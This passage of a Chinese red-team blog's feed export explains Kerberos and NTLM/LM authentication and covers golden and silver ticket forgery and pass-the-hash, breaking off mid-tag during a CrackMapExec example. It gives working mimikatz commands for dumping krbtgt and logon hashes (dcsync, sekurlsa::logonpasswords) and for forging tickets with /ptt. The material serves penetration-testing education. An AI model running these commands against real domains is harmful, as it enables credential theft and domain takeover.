src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。&lt;/p&gt;</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos协议之黄金票据和白银票据</title>
    <link href="http://www.secice.cn/p/737303c7"/>
    <id>http://www.secice.cn/p/737303c7</id>
    <published>2020-11-25T03:42:55.000Z</published>
    <updated>2020-12-24T02:18:55.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p><h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul><li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li><li>2、域名称    secice.cn</li><li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li><li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li></ul><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt//导出 krbtgt 密码 hash</span>也可以mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" alt="黄金票据利用"></p><p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>也可以mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" alt="黄金票据利用"></p><blockquote><p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p></blockquote><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p><h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul><li>1、域名称        secice.cn</li><li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li><li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li><li>4、伪造的用户名(可以是任意的)</li></ul><p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p><h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p><pre><code class="hljs awk">privilege::debugsekurlsa::logonpasswords也可以mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" alt="白银票据利用"></p><p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p><pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" alt="白银票据利用"></p><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" alt="白银票据利用"></p><p>不仅仅是cifs服务还有其他：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" alt="白银票据利用"></p><p>ldap可以用来dcsync</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol><li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li><li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li><li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Golden-Ticket-黄金票据&quot;&gt;&lt;a href=&quot;#Golden-Ticket-黄金票据&quot; class=&quot;headerlink&quot; title=&quot;Golden Ticket(黄金票据)&quot;&gt;&lt;/a&gt;Golden Ticket(黄金票据)&lt;/h2&gt;&lt;p&gt;在AS_</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="http://www.secice.cn/p/fe98a932"/>
    <id>http://www.secice.cn/p/fe98a932</id>
    <published>2020-11-23T03:42:55.000Z</published>
    <updated>2020-12-24T02:19:04.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos-协议简介"><a href="#Kerberos-协议简介" class="headerlink" title="Kerberos 协议简介"></a>Kerberos 协议简介</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos-协议框架"><a href="#Kerberos-协议框架" class="headerlink" title="Kerberos 协议框架"></a>Kerberos 协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数</p><p>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/01.png" alt="Kerberos 协议框架"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，</p><p>验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server</p><p>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/02.png" alt="Kerberos 协议框架"></p><h2 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/03.png" alt="Kerberos 认证流程"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/04.png" alt="The Authentication Service Exchange"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/05.png" alt="The Ticket Granting Service(TGS) Exchange"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/06.png" alt="The Client/Server Authentication Exchange"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kerberos-协议简介&quot;&gt;&lt;a href=&quot;#Kerberos-协议简介&quot; class=&quot;headerlink&quot; title=&quot;Kerberos 协议简介&quot;&gt;&lt;/a&gt;Kerberos 协议简介&lt;/h2&gt;&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>彻底理解Windows认证</title>
    <link href="http://www.secice.cn/p/fe98a932"/>
    <id>http://www.secice.cn/p/fe98a932</id>
    <published>2020-11-23T03:42:55.000Z</published>
    <updated>2020-12-24T08:03:54.287Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-本地认证"><a href="#0x00-本地认证" class="headerlink" title="0x00 本地认证"></a>0x00 本地认证</h2><h3 id="本地认证基础知识"><a href="#本地认证基础知识" class="headerlink" title="本地认证基础知识"></a>本地认证基础知识</h3><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？</p><p><code>%SystemRoot%\system32\config\sam</code></p><p>当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!</p><p>这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p><p>上面认证的过程只是粗略的说法，整个认证过程并没有那么简单，从操作系统的角度来看，还是需要铺垫很多概念的。</p><p><strong>Windows本身不保存明文密码，只保留密码的Hash。</strong></p><blockquote><p>Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。 – Baidu</p></blockquote><p>为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。</p><h3 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h3><p>在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。</p><p>这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p><p>也就是说，NTLM与NTLM Hash相互对应。</p><p>在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><h3 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h3><p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p><pre><code class="hljs apache"><span class="hljs-attribute">admin</span> -&gt; hex(<span class="hljs-number">16</span>进制编码) = <span class="hljs-number">61646</span>d<span class="hljs-number">696</span>e<span class="hljs-attribute">61646d696e</span> -&gt; Unicode = <span class="hljs-number">610064006</span>d<span class="hljs-number">0069006</span>e<span class="hljs-number">00</span><span class="hljs-attribute">610064006d0069006e00</span> -&gt; MD<span class="hljs-number">4</span> = <span class="hljs-number">209</span>c<span class="hljs-number">6174</span>da<span class="hljs-number">490</span>caeb<span class="hljs-number">422</span>f<span class="hljs-number">3</span>fa<span class="hljs-number">5</span>a<span class="hljs-number">7</span>ae<span class="hljs-number">634</span></code></pre><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="hljs-function"><span class="hljs-title">lsass</span>.exe -&gt;</span> (认证)</code></pre><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。</p><p><strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong></p><p>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p><p>LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p><pre><code class="hljs subunit">将所有小写字母转换为大写字母• &gt;123ABC // 未达到7个字符• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补• &gt;31323341424300000000000000• 将密码分割为两组7个字节的块• &gt;31323341424300 00000000000000 // 16进制• 将每组转化为比特流，不足56Bit则在左边加0• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000• 将比特流按照7比特一组，分出8组，末尾加0由于后者都为0，结果可想而知，那就都是0;• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB<span class="hljs-string">-91</span>- 2F<span class="hljs-string">-5</span>E<span class="hljs-string">-69</span><span class="hljs-string">-7</span>C• 由于我们的密码不超过7字节，所以后面的一半是固定的:• AA-D3-B4<span class="hljs-string">-35</span>-B5<span class="hljs-string">-14</span><span class="hljs-string">-04</span>-EE• 连接两个DES加密字符串。这是LM哈希。• 48-D7-EB<span class="hljs-string">-91</span><span class="hljs-string">-2</span>F<span class="hljs-string">-5</span>E<span class="hljs-string">-69</span><span class="hljs-string">-7</span>C-AA-D3-B4<span class="hljs-string">-35</span>-B5<span class="hljs-string">-14</span><span class="hljs-string">-04</span>-EE</code></pre><p>在上面的产生过程中，脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p><p>并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p><h2 id="0x01-网络认证"><a href="#0x01-网络认证" class="headerlink" title="0x01 网络认证"></a>0x01 网络认证</h2><p>在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑 上的网络环境(工作区)，隶属于工作组的机器之间无法互相建 立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。</p><p>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</p><p>这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p><p>早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p><p><strong>这个协议只支持Windows</strong></p><h3 id="Chalenge-Response"><a href="#Chalenge-Response" class="headerlink" title="Chalenge/Response"></a>Chalenge/Response</h3><p>NTLM协议的认证过程分为三步：</p><ul><li>协商</li><li>质询</li><li>验证</li></ul><p><strong>协商</strong>：主要用于确认双方协议版本</p><p><strong>质询</strong>：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p><p><strong>验证</strong>：验证主要是在质询完成后，验证结果，是认证的最后一步。</p><p>质询的完整过程：</p><ul><li>1.客户端向服务器端发送用户信息(用户名)请求</li><li>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li><li>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li></ul><p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</p><p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p><p>使用另外一种方式解读：</p><p>1.Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user</p><ul><li>如果没有，返回认证失败</li><li>如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。</li></ul><p>2.Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。</p><p>3.Server接收到Client发送的Response，将Response与之 前的Net-NTLM Hash进行比较，如果相等，则认证通过。</p><p>注意:</p><p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</p><p>2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/01.png" alt="NTLM 协议"></p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p><p>下面细说一下有什么不同:</p><ul><li>Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</li><li>Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</li></ul><p>现在应该能够理解什么是NTLM、NTLM Hash、LM、LM Hash、Net NTLM Hash了吧？</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。</p><ul><li>什么是哈希传递?</li></ul><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p><ul><li>哈希传递的作用?</li></ul><p>解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又 想扩大战果的问题。</p><p><strong>Pass The Hash - 必要条件</strong></p><ul><li>哈希传递需要被认证的主机能够访问到服务器(废话)</li><li>哈希传递需要被传递认证的用户名</li><li>哈希传递需要被传递认证用户的NTLM Hash</li></ul><p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯</p><p>其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p>Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p><p>Pass The Hash的工具：</p><ul><li>Smbmap</li><li>CrackMapExec</li><li>Smbexec</li><li>Metasploit</li></ul><p>使用CrackMapExec实现Hash传递：</p><pre><code class="hljs apache"><span 